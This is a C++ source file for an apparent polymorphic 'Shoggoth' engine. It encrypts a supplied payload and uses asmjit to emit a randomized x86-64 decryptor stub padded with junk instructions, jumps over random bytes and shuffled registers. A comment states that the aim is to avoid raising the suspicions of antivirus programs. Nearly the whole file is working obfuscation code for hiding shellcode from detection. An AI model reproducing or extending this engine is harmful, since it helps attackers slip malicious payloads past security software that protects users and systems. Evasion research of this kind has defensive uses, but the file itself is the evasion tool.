#include "ShoggothEngine.h"
#include "AuxFunctions.h"
///////////////////////////////////////////////////////////
//
// main function - encrypts data and generates polymorphic
//                 decryptor code
//
///////////////////////////////////////////////////////////
typedef int (*Func)(void);
#define BLOCK_SIZE 8

ShoggothPolyEngine::ShoggothPolyEngine():
    allRegs{ x86::rax, x86::rbx, x86::rcx, x86::rdx, x86::rsi, x86::rdi, x86::rsp, x86::rbp, x86::r8,x86::r9,x86::r10,x86::r11,x86::r12,x86::r13,x86::r14,x86::r15 },
    generalPurposeRegs { x86::rax, x86::rbx, x86::rcx, x86::rdx, x86::rsi, x86::rdi, x86::r8,x86::r9,x86::r10,x86::r11,x86::r12,x86::r13,x86::r14,x86::r15 }
    {
    srand(time(NULL));
    this->StartAsmjit();
    // allRegs = { x86::rax, x86::rbx, x86::rcx, x86::rdx, x86::rsi, x86::rdi, x86::rsp, x86::rbp, x86::r8,x86::r9,x86::r10,x86::r11,x86::r12,x86::r13,x86::r14,x86::r15 };
    // generalPurposeReg = { x86::rax, x86::rbx, x86::rcx, x86::rdx, x86::rsi, x86::rdi, x86::r8,x86::r9,x86::r10,x86::r11,x86::r12,x86::r13,x86::r14,x86::r15 };
}


// *****************************************************

void ShoggothPolyEngine::DebugBuffer(PBYTE buffer, int bufferSize) {
    FILE* hFile = fopen("garbagetest.bin", "wb");

    if (hFile != NULL)
    {
        fwrite(buffer, bufferSize, 1, hFile);
        fclose(hFile);
    }
}


PBYTE ShoggothPolyEngine::AssembleCodeHolder(int& codeSize) {
    Func functionPtr;
    PBYTE returnValue;
    endOffset = asmjitAssembler->offset();
    codeSize = endOffset - startOffset;
    Error err = asmjitRuntime.add(&functionPtr, &asmjitCodeHolder);
    // returnValue = (PBYTE) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, codeSize);
    // memcpy(returnValue, functionPtr, codeSize);
    this->ResetAsmjit();
    return (PBYTE)functionPtr;
}


void ShoggothPolyEngine::MixupArrayRegs(x86::Reg* registerArr, WORD size) {
    x86::Reg temp;
    for (int i = size - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        // Swap arr[i] with the element
        temp = registerArr[i];
        registerArr[i] = registerArr[j];
        registerArr[j] = temp;
    }
}



void ShoggothPolyEngine::StartAsmjit() {
    asmjitCodeHolder.init(asmjitRuntime.environment());
    asmjitAssembler = new x86::Assembler(&asmjitCodeHolder);
    startOffset = asmjitAssembler->offset();
}

void ShoggothPolyEngine::ResetAsmjit() {
    asmjitCodeHolder.reset();
    startOffset = 0;
    endOffset = 0;
    this->StartAsmjit();
}


void ShoggothPolyEngine::PushAllRegisters() {
    this->MixupArrayRegs(this->allRegs, 16);
    for (int i = 0; i < 16; i++) {
        asmjitAssembler->push(this->allRegs[i]);
    }
}

void ShoggothPolyEngine::PopAllRegisters() {
    for (int i = 0; i < 16; i++) {
        asmjitAssembler->pop(this->allRegs[i]);
    }
}

x86::Gp ShoggothPolyEngine::GetRandomRegister() {
    this->MixupArrayRegs(this->allRegs, 16);
    return this->allRegs[RandomizeInRange(0, 15)];
}

x86::Gp ShoggothPolyEngine::GetRandomGeneralPurposeRegister() {
    this->MixupArrayRegs(this->generalPurposeRegs, 14);
    return this->generalPurposeRegs[RandomizeInRange(0, 13)];
}


void ShoggothPolyEngine::StartEncoding(PBYTE payload, uint64_t payloadSize) {
    int firstGarbageSize = 0;
    int firstGarbageWithPayloadSize = 0;
    int firstDecryptorSize = 0;
    int firstDecryptorAndEncryptedPayloadSize = 0;
    PBYTE firstGarbage = NULL;
    PBYTE firstGarbageWithPayload = NULL;
    PBYTE firstEncryptedStup = NULL;
    PBYTE firstDecryptor = NULL;
    PBYTE firstDecryptorAndEncryptedPayload = NULL;
    // Start codeholder and assembler
    this->StartAsmjit();
    // Push all registers first
    this->PushAllRegisters();
    
    // Get Some Garbage Instructions
    firstGarbage = this->GenerateRandomGarbage(firstGarbageSize);
    firstGarbageWithPayloadSize = payloadSize + firstGarbageSize;
    firstGarbageWithPayload = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, firstGarbageWithPayloadSize);
    memcpy(firstGarbageWithPayload, firstGarbage, firstGarbageSize);
    memcpy(firstGarbageWithPayload + firstGarbageSize, payload, payloadSize);
    
    //Func fun2 = (Func)VirtualAlloc(NULL,firstGarbageWithPayloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    //memcpy(fun2, firstGarbageWithPayload, firstGarbageWithPayloadSize);
    //fun2();
    firstEncryptedStup = this->FirstEncryption(firstGarbageWithPayload, firstGarbageWithPayloadSize);
    //firstEncryptionStup = this->FirstEncryption(payload, payloadSize);
    firstDecryptor = this->FirstDecryptor(firstGarbageWithPayloadSize, firstDecryptorSize);
    this->DebugBuffer(firstDecryptor, firstDecryptorSize);
    firstDecryptorAndEncryptedPayloadSize = firstDecryptorSize + firstGarbageWithPayloadSize;
    firstDecryptorAndEncryptedPayload = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, firstDecryptorAndEncryptedPayloadSize);
    memcpy(firstDecryptorAndEncryptedPayload, firstDecryptor, firstDecryptorSize);
    memcpy(firstDecryptorAndEncryptedPayload + firstDecryptorSize, firstEncryptedStup, firstGarbageWithPayloadSize);
    // TEST
    //Func fun = (Func)VirtualAlloc(NULL, firstDecryptorSize  + firstGarbageWithPayloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    //memcpy(fun, firstDecryptor, firstDecryptorSize);
    //memcpy((PBYTE) fun + firstDecryptorSize, firstEncryptedStup, firstGarbageWithPayloadSize);
    //fun();
    this->PopAllRegisters();
    HeapFree(GetProcessHeap(), NULL, firstGarbage);
    HeapFree(GetProcessHeap(), NULL, firstGarbageWithPayload);
    HeapFree(GetProcessHeap(), NULL, firstEncryptedStup);
    HeapFree(GetProcessHeap(), NULL, firstDecryptor);
    HeapFree(GetProcessHeap(), NULL, firstDecryptorAndEncryptedPayload);
}

/*
* TODO REPLACE WITH A GOOD ALGORITHM
    call randomLabel
    randomLabel:
    pop rax (letssay)
    mov rbx, payloadSize
    add rax,sizepatch
    loop:
    test rbx,rbx
    jz data
    sub [rax],-1
    inc rax
    dec rbx
    jmp loop
    data:

    asmjitAssembler->add(regSrc, imm(272727));

    // save the position of the previous DWORD
    // so that we can later update it to contain
    // the length of the remainder of the function
    // Bi oncesi
    posSrcPtr = asmjitAssembler->offset() - sizeof(DWORD);
}

 size_t current_position = asmjitAssembler->offset();

    DWORD dwAdjustSize = static_cast<DWORD>(asmjitAssembler->offset() - posDeltaOffset);

    asmjitAssembler->setOffset(posSrcPtr);
    // correct the instruction which sets up
    // a pointer to the encrypted data block
    // at the end of the decryption function
    //
    // this pointer is loaded into the regSrc
    // register, and must be updated by the
    // size of the remainder of the function
    // after the delta_offset label --> Labelden oncesi + labeldan sonrasi
    asmjitAssembler->dd(dwAdjustSize + dwUnusedCodeSize);
    asmjitAssembler->setOffset(current_position);


    TODO: Delta offset calculations can rouse the suspicions of antivirus programs, since normal 
    applications do not have a need for this kind of thing. The combination of call and pop r32 
    can cause the application to be suspected of containing malware. In order to prevent this,
    we must generate extra code between these two instructions, and utilize a different means of getting values from the stack.
*/

PBYTE ShoggothPolyEngine::FirstDecryptor(int payloadSize, int& firstDecryptorSize) {
    // Dummy Decryptor
    char* randomStringForCall = GenerateRandomString();
    char* randomStringForLoop = GenerateRandomString();
    char* randomStringForData = GenerateRandomString();
    DWORD adjustSize = 0;
    uint64_t patchAddress = NULL;
    uint64_t callOffset = NULL;
    uint64_t currentOffset = NULL;
    Label randomLabelForCall = asmjitAssembler->newNamedLabel(randomStringForCall, 16);
    Label randomLabelForLoop = asmjitAssembler->newNamedLabel(randomStringForLoop, 16);
    Label randomLabelForData = asmjitAssembler->newNamedLabel(randomStringForData, 16);
    x86::Gp randomGeneralPurposeRegisterSize = this->GetRandomGeneralPurposeRegister();
    x86::Gp randomGeneralPurposeRegisterAddress = this->GetRandomGeneralPurposeRegister();
    while (randomGeneralPurposeRegisterAddress.id() == randomGeneralPurposeRegisterSize.id()) {
        randomGeneralPurposeRegisterAddress = this->GetRandomGeneralPurposeRegister();
    }
    asmjitAssembler->call(randomLabelForCall);
    asmjitAssembler->bind(randomLabelForCall);
    callOffset = asmjitAssembler->offset();
    asmjitAssembler->pop(randomGeneralPurposeRegisterAddress);
    asmjitAssembler->mov(randomGeneralPurposeRegisterSize, imm(payloadSize));
    asmjitAssembler->add(randomGeneralPurposeRegisterAddress, imm(1234));
    patchAddress = asmjitAssembler->offset() - sizeof(DWORD);
    asmjitAssembler->bind(randomLabelForLoop);
    asmjitAssembler->test(randomGeneralPurposeRegisterSize, randomGeneralPurposeRegisterSize);
    asmjitAssembler->jz(randomLabelForData);
    asmjitAssembler->sub(x86::byte_ptr(randomGeneralPurposeRegisterAddress), 1);
    asmjitAssembler->inc(randomGeneralPurposeRegisterAddress);
    asmjitAssembler->dec(randomGeneralPurposeRegisterSize);
    asmjitAssembler->jmp(randomLabelForLoop);
    asmjitAssembler->bind(randomLabelForData);
    currentOffset = asmjitAssembler->offset();
    adjustSize = currentOffset - callOffset;
    asmjitAssembler->setOffset(patchAddress);
    asmjitAssembler->dd(adjustSize);
    asmjitAssembler->setOffset(currentOffset);
    //asmjitAssembler->nop();

    PBYTE returnValue = this->AssembleCodeHolder(firstDecryptorSize);
    //this->DebugBuffer(returnValue, firstDecryptorSize);
    HeapFree(GetProcessHeap(), NULL, randomStringForCall);
    HeapFree(GetProcessHeap(), NULL, randomStringForLoop);
    HeapFree(GetProcessHeap(), NULL, randomStringForData);
    return returnValue;
}


PBYTE ShoggothPolyEngine::FirstEncryption(PBYTE plainPayload, int payloadSize) {
    // Dummy Encryption
    PBYTE copyPayload = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, payloadSize);
    memcpy(copyPayload, plainPayload, payloadSize);
    for (int i = 0; i < payloadSize; i++) {
        copyPayload[i] += 1;
    }
    return copyPayload;
}

PBYTE ShoggothPolyEngine::SecondDecryptor(int payloadSize, int& secondDecryptorSize) {
    // Ya constantla olsun ya da registera atanan bir deger ile
    return NULL;
}

PBYTE ShoggothPolyEngine::SecondEncryption(PBYTE plainPayload, int payloadSize, int& newPayloadSize) {
    int numberOfBlocks = (payloadSize / BLOCK_SIZE);
    PBYTE encryptedArea = NULL;
    if (payloadSize % BLOCK_SIZE) {
        numberOfBlocks++;
    }
    encryptedArea = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, numberOfBlocks * BLOCK_SIZE);
    memcpy(encryptedArea, plainPayload, payloadSize);
    for (int i = 0; i < payloadSize % BLOCK_SIZE; i++) {
        // If it is equal to block size, there is nothing to worry about because it will not enter this loop
        encryptedArea[payloadSize + i] = 0x90;
    }
    return NULL;
}


PBYTE ShoggothPolyEngine::GenerateRandomGarbage(int &garbageSize) {
    PBYTE garbageInstructions;
    PBYTE jmpOverRandomByte;
    Func garbageInstTest;
    Func jmpOverRandomByteTest;
    int codeSizeGarbage = 0;
    int codeSizeJmpOver = 0;
    PBYTE returnValue = NULL;
    // Get garbage instructions
    this->GenerateGarbageInstructions();
    garbageInstructions = this->AssembleCodeHolder(codeSizeGarbage);
    // garbageInstTest = (Func)garbageInstructions;
    // VirtualProtect(garbageInstructions, codeSizeGarbage, PAGE_EXECUTE_READWRITE, NULL);
    // garbageInstTest();
    // Generate jmp over random byte
    this->GenerateJumpOverRandomData();
    jmpOverRandomByte = this->AssembleCodeHolder(codeSizeJmpOver);
    // jmpOverRandomByteTest = (Func)jmpOverRandomByte;
    // VirtualProtect(jmpOverRandomByteTest, codeSizeGarbage, PAGE_EXECUTE_READWRITE, NULL);
    // jmpOverRandomByteTest();
    returnValue = (PBYTE) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, codeSizeGarbage + codeSizeJmpOver);
    if (RandomizeBinary()) {
        memcpy(returnValue, garbageInstructions, codeSizeGarbage);
        memcpy(returnValue + codeSizeGarbage, jmpOverRandomByte, codeSizeJmpOver);
    }
    else {
        memcpy(returnValue, jmpOverRandomByte, codeSizeJmpOver);
        memcpy(returnValue + codeSizeJmpOver, garbageInstructions, codeSizeGarbage);
    }
    garbageSize = codeSizeJmpOver + codeSizeGarbage;
    return returnValue;
}

 // Tested
void ShoggothPolyEngine::GenerateJumpOverRandomData() {
    size_t randomSize = RandomizeInRange(30, 50);
    PBYTE randomBytes = GetRandomBytes(randomSize);
    char* randomString = GenerateRandomString();
    Label randomLabelJmp = asmjitAssembler->newNamedLabel(randomString, 16);
    asmjitAssembler->jmp(randomLabelJmp);
    asmjitAssembler->embed(randomBytes, randomSize);
    asmjitAssembler->bind(randomLabelJmp);
    HeapFree(GetProcessHeap(), NULL, randomBytes);
    HeapFree(GetProcessHeap(), NULL, randomString);
    // this->DebugCurrentCodeBuffer();
}

void ShoggothPolyEngine::GenerateGarbageInstructions() {
    int randomValue = RandomizeInRange(1, 4);
    switch (randomValue) {
        case 1:
            this->GenerateGarbageFunction();
            break;
        case 2:
            this->GenerateSafeInstruction();
            break;
        case 3:
            this->GenerateReversedInstructions();
            break;
        case 4:
            this->GenerateJumpedInstructions();
            break;
        default:
            break;
    }
}

void ShoggothPolyEngine::GenerateGarbageFunction() {
    BYTE randomByte = (BYTE)RandomizeInRange(1, 255);
    if (RandomizeBinary() == 0)
    {
        asmjitAssembler->push(x86::rbp);
        asmjitAssembler->mov(x86::rbp, x86::rsp);
        asmjitAssembler->sub(x86::rsp, randomByte);

    }
    else {
        asmjitAssembler->enter(imm(0), imm(0));
    }
    this->GenerateGarbageInstructions();
    if (RandomizeBinary() == 0)
    {
        asmjitAssembler->leave();
    }
    else
    {
        // equivalent to "leave"
        asmjitAssembler->mov(x86::rsp, x86::rbp);
        asmjitAssembler->pop(x86::rbp);
    }
}

// Generates only one instruction which doesn't have any affect
void ShoggothPolyEngine::GenerateSafeInstruction() {
    int randomIndexForSelect = RandomizeInRange(1, 33);
    x86::Gp randomRegister = this->GetRandomRegister();
    char* randomString = GenerateRandomString();
    Label randomLabelJmp = asmjitAssembler->newNamedLabel(randomString, 16);

    switch (randomIndexForSelect) {
    case 1:
        // Nop instruction +
        asmjitAssembler->nop();
        break;
    case 2:
        // Cld instruction - Clear Direction flag in EFLAGS +
        asmjitAssembler->cld();
        break;
    case 3:
        // CLC instruction - Clear carry flag +
        asmjitAssembler->clc();
        break;
    case 4:
        // CMC instruction - Complement carry flag +
        asmjitAssembler->cmc();
        break;
    case 5:
        // fwait instruction - Causes the processor to check for and handle pending, unmasked, floating-point exceptions before proceedin + VSde okey
        asmjitAssembler->fwait();
        break;
    case 6:
        // fnop instruction - Performs no FPU operation. +
        asmjitAssembler->fnop();
        break;
    case 7:
        // fxam instruction - The fxam instruction examines the value in st(0) and reports the results in the condition code bits +
        asmjitAssembler->fxam();
        break;
    case 8:
        // ftst instruction - The FTST instruction compares the value on the top of stack with zero. +
        asmjitAssembler->ftst();
        break;
    case 9:
        // jmp - pass the next inst
        asmjitAssembler->jmp(randomLabelJmp);
        asmjitAssembler->bind(randomLabelJmp);
        break;
    case 10:
        // xor register,0 - nothing changes +
        asmjitAssembler->xor_(randomRegister, 0);
        break;
    case 11:
        // bt register, register - The CF flag contains the value of the selected bit. +
        asmjitAssembler->bt(randomRegister, randomRegister);
        break;
    case 12:
        // cmp - compare instruction + 
        asmjitAssembler->cmp(randomRegister, randomRegister);
        break;
    case 13:
        // mov instruction +
        asmjitAssembler->mov(randomRegister, randomRegister);
        break;
    case 14:
        // xchg - The XCHG (exchange data) instruction exchanges the contents of two operands. VSde okey
        asmjitAssembler->xchg(randomRegister, randomRegister);
        break;
    case 15:
        // test - bitwise and +
        asmjitAssembler->test(randomRegister, randomRegister);
        break;
    case 16:
        // cmova - The cmova conditional move if above check the state of CF AND ZF. +
        asmjitAssembler->cmova(randomRegister, randomRegister);
        break;
    case 17:
        // cmovb - The cmovb conditional move if below check the state of CF. +
        asmjitAssembler->cmovb(randomRegister, randomRegister);
        break;
    case 18:
        // cmove - similar +
        asmjitAssembler->cmove(randomRegister, randomRegister);
        break;
    case 19:
        // cmovg +
        asmjitAssembler->cmovg(randomRegister, randomRegister);
        break;
    case 20:
        // cmovl +
        asmjitAssembler->cmovl(randomRegister, randomRegister);
        break;
    case 21:
        // cmovo +
        asmjitAssembler->cmovo(randomRegister, randomRegister);
        break;
    case 22:
        // cmovp +
        asmjitAssembler->cmovp(randomRegister, randomRegister);
        break;
    case 23:
        // cmovs +
        asmjitAssembler->cmovs(randomRegister, randomRegister);
        break;
    case 24:
        // cmovae +
        asmjitAssembler->cmovae(randomRegister, randomRegister);
        break;
    case 25:
        // cmovge +
        asmjitAssembler->cmovge(randomRegister, randomRegister);
        break;
    case 26:
        // cmovle +
        asmjitAssembler->cmovle(randomRegister, randomRegister);
        break;
    case 27:
        // cmovne
        asmjitAssembler->cmovne(randomRegister, randomRegister);
        break;
    case 28:
        // cmovng
        asmjitAssembler->cmovng(randomRegister, randomRegister);
        break;
    case 29:
        // cmovnl
        asmjitAssembler->cmovnl(randomRegister, randomRegister);
        break;
    case 30:
        // cmovno
        asmjitAssembler->cmovno(randomRegister, randomRegister);
        break;
    case 31:
        // cmovnp +
        asmjitAssembler->cmovnp(randomRegister, randomRegister);
        break;
    case 32:
        // cmovns + 
        asmjitAssembler->cmovns(randomRegister, randomRegister);
        break;
    case 33:
        // cmovbe +
        asmjitAssembler->cmovbe(randomRegister, randomRegister);
        break;
    default:
        ;
    }
    HeapFree(GetProcessHeap(), NULL, randomString);
}

void ShoggothPolyEngine::GenerateReversedInstructions() {
    int randomIndexForSelect = RandomizeInRange(1, 10);
    x86::Gp randomRegister = this->GetRandomRegister();
    BYTE randomValue = (BYTE)(RandomizeInRange(0, 255));
    switch (randomIndexForSelect) {
    case 1:
        // not register;garbage;not register +
        asmjitAssembler->not_(randomRegister);
        this->GenerateGarbageInstructions();
        asmjitAssembler->not_(randomRegister);
        break;
    case 2:
        // neg register;garbage;neg register +
        asmjitAssembler->neg(randomRegister);
        this->GenerateGarbageInstructions();
        asmjitAssembler->neg(randomRegister);
        break;
    case 3:
        // inc register;garbage;dec register + 
        asmjitAssembler->inc(randomRegister);
        this->GenerateGarbageInstructions();
        asmjitAssembler->dec(randomRegister);
        break;
    case 4:
        // dec register;garbage;inc register +
        asmjitAssembler->dec(randomRegister);
        this->GenerateGarbageInstructions();
        asmjitAssembler->inc(randomRegister);
        break;
    case 5:
        // push register;garbage;pop register +
        asmjitAssembler->push(randomRegister);
        this->GenerateGarbageInstructions();
        asmjitAssembler->pop(randomRegister);
        break;
    case 6:
        // bswap register;garbage;bswap register +
        asmjitAssembler->bswap(randomRegister);
        this->GenerateGarbageInstructions();
        asmjitAssembler->bswap(randomRegister);
        break;
    case 7:
        // add register,value ;garbage;sub register,value +
        asmjitAssembler->add(randomRegister, randomValue);
        this->GenerateGarbageInstructions();
        asmjitAssembler->sub(randomRegister, randomValue);
        break;
    case 8:
        // sub register,value ;garbage;add register,value +
        asmjitAssembler->sub(randomRegister, randomValue);
        this->GenerateGarbageInstructions();
        asmjitAssembler->add(randomRegister, randomValue);
        break;
    case 9:
        // ror register,value ;garbage;rol register,value +
        asmjitAssembler->ror(randomRegister, randomValue);
        this->GenerateGarbageInstructions();
        asmjitAssembler->rol(randomRegister, randomValue);
        break;
    case 10:
        // rol register,value ;garbage;ror register,value +
        asmjitAssembler->rol(randomRegister, randomValue);
        this->GenerateGarbageInstructions();
        asmjitAssembler->ror(randomRegister, randomValue);
        break;
    default:
        break;
    }
}

void ShoggothPolyEngine::GenerateJumpedInstructions() {
    int randomIndexForSelect = RandomizeInRange(1, 16);
    x86::Gp randomRegister = this->GetRandomRegister();
    char* randomString = GenerateRandomString();
    Label randomLabelJmp = asmjitAssembler->newNamedLabel(randomString, 16);
    switch (randomIndexForSelect) {
        case 1:
            // jmp label;garbage;label: +
            asmjitAssembler->jmp(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 2:
            asmjitAssembler->jae(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 3:
            asmjitAssembler->ja(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 4:
            asmjitAssembler->jbe(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 5:
            asmjitAssembler->jb(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 6:
            asmjitAssembler->je(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 7:
            asmjitAssembler->jge(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 8:
            asmjitAssembler->jg(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 9:
            asmjitAssembler->jle(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 10:
            asmjitAssembler->jl(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 11:
            asmjitAssembler->jne(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 12:
            asmjitAssembler->jnp(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 13:
            asmjitAssembler->jns(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 14:
            asmjitAssembler->jo(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 15:
            asmjitAssembler->jp(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 16:
            asmjitAssembler->js(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        default:
            break;
    }
}

void ShoggothPolyEngine::RandomUnsafeGarbage() {
    x86::Gp randomGeneralPurposeRegisterDest = this->GetRandomGeneralPurposeRegister();
    x86::Gp randomGeneralPurposeRegisterSource = this->GetRandomGeneralPurposeRegister();
    int randomIndexForSelect = RandomizeInRange(1, 16);
    while (randomGeneralPurposeRegisterDest.id() == randomGeneralPurposeRegisterSource.id()) {
        randomGeneralPurposeRegisterDest = this->GetRandomGeneralPurposeRegister();
    }
    asmjitAssembler->push(randomGeneralPurposeRegisterDest);
    BYTE randomValue = (BYTE)(RandomizeInRange(0, 255));
    //TODO : ADD memory examples, 
    switch (randomIndexForSelect) {
    case 1:
        asmjitAssembler->add(randomGeneralPurposeRegisterDest, randomValue);
        break;
    case 2:
        asmjitAssembler->sub(randomGeneralPurposeRegisterDest, randomValue);
        break;
    case 3:
        asmjitAssembler->xor_(randomGeneralPurposeRegisterDest, randomValue);
        break;
    case 4:
        asmjitAssembler->shl(randomGeneralPurposeRegisterDest, randomValue);
        break;
    case 5:
        asmjitAssembler->shr(randomGeneralPurposeRegisterDest, randomValue);
        break;
    default:
        break;
    }
    asmjitAssembler->pop(randomGeneralPurposeRegisterDest);
}

/*    
    // Errored instructions because of asmjit
    
    // cmovc - The cmovc conditional move if carry check the state of CF
    // asmjitAssembler->cmovc(randomRegister, randomRegister); // Sikinti VSde de
    
    // cmovz
    // asmjitAssembler->cmovz(randomRegister, randomRegister); // Sikinti VSde de
    
    // cmovna
    // asmjitAssembler->cmovna(randomRegister, randomRegister); // Sikinti VSde de
     
    // cmovnb 
    // asmjitAssembler->cmovnb(randomRegister, randomRegister); // Sikinti VSde de
    
    // cmovnc 
    // asmjitAssembler->cmovnc(randomRegister, randomRegister); // Sikinti VSde de
    
    // cmovnz 
    // asmjitAssembler->cmovnz(randomRegister, randomRegister); // Sikinti VSde de
    
    // cmovpe 
    // asmjitAssembler->cmovpe(randomRegister, randomRegister); // Sikinti VSde de
    
    // cmovpo 
    // asmjitAssembler->cmovpo(randomRegister, randomRegister); // Sikinti VSde de
    
    // cmovnae 
    // asmjitAssembler->cmovnae(randomRegister, randomRegister); // Sikinti VSde de
    
    // cmovnbe 
    // asmjitAssembler->cmovnbe(randomRegister, randomRegister); // Sikinti VSde de
    
    // cmovnle Sikinti
    // asmjitAssembler->cmovnle(randomRegister, randomRegister); // Sikinti VSde de
    
    // cmovnge Sikinti
    // asmjitAssembler->cmovnge(randomRegister, randomRegister); // Sikinti VSde de

    // jc SIKINTI
        asmjitAssembler->jc(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);
    // jnae SIKINTI
        asmjitAssembler->jnae(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);

    // jnbe SIKINTI
        asmjitAssembler->jnbe(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);

    // jnb SIKINTI
        asmjitAssembler->jnb(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);

    // jnc SIKINTI
        asmjitAssembler->jnc(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);

    // jnge SIKINTI
        asmjitAssembler->jnge(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);

    // jng SIKINTI
        asmjitAssembler->jng(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);

    // jnle SIKINTI
        asmjitAssembler->jnle(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);

    // jnl SIKINTI
        asmjitAssembler->jnl(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);

    // jnz SIKINTI
        asmjitAssembler->jnz(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);

    // jpe SIKINTI
        asmjitAssembler->jpe(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);

    // jpo SIKINTI
        asmjitAssembler->jpo(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);

    // jz SIKINTI
        asmjitAssembler->jz(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);
*/